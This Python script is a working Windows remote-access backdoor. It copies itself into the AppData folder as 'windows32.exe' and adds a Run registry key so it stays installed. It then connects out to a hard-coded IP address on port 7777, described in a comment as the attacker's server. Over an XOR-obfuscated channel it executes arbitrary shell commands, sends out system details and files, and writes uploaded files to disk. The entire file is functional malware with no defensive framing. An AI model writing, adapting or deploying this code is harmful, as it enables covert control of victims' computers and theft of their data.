import socket
import subprocess
import os
import sys
import time
import platform
import base64
import shutil
from itertools import cycle

# Function to establish persistence
def persist():
    file_location = os.path.join(os.environ["appdata"], "windows32.exe")
    if not os.path.exists(file_location):
        shutil.copyfile(sys.executable, file_location)
        subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Windows32 /t REG_SZ /d "{file_location}"', shell=True)

# Function to encrypt/decrypt communication
def encrypt_decrypt(data, key='secretkey'):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, cycle(key)))

# Function to handle commands from the server
def command_handler(s):
    while True:
        try:
            # Receive and decrypt command
            command = encrypt_decrypt(s.recv(2048).decode())
            if command.lower() == "exit":
                break
            elif command.lower() == "sysinfo":
                # Gather and send system information
                sysinfo = f"OS: {platform.system()} {platform.release()}\n"
                sysinfo += f"Hostname: {socket.gethostname()}\n"
                sysinfo += f"User: {os.getlogin()}\n"
                s.send(encrypt_decrypt(sysinfo).encode())
            elif command.lower().startswith("download"):
                # Extract file path and send the file
                _, file_path = command.split("*")
                if os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        s.send(base64.b64encode(f.read()))
                else:
                    s.send(encrypt_decrypt("File not found.").encode())
            elif command.lower().startswith("upload"):
                # Extract file path and receive the file
                _, file_path = command.split("*")
                with open(file_path, "wb") as f:
                    file_data = s.recv(5000)
                    f.write(base64.b64decode(file_data))
                s.send(encrypt_decrypt("File uploaded successfully.").encode())
            else:
                # Execute command
                output = subprocess.getoutput(command)
                if not output:
                    output = "Command executed."
                # Send encrypted output
                s.send(encrypt_decrypt(output).encode())
        except Exception as e:
            # Handle potential errors
            s.send(encrypt_decrypt(f"Error: {str(e)}").encode())
            continue

# Main function
def main():
    # Establish persistence
    persist()

    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Keep trying to connect to the attacker's server
    while True:
        try:
            s.connect(("159.65.152.59", 7777))
            break
        except:
            time.sleep(5)  # Wait before trying to connect again

    # Start the command handler
    command_handler(s)

    # Close the connection
    s.close()

if __name__ == "__main__":
    main()
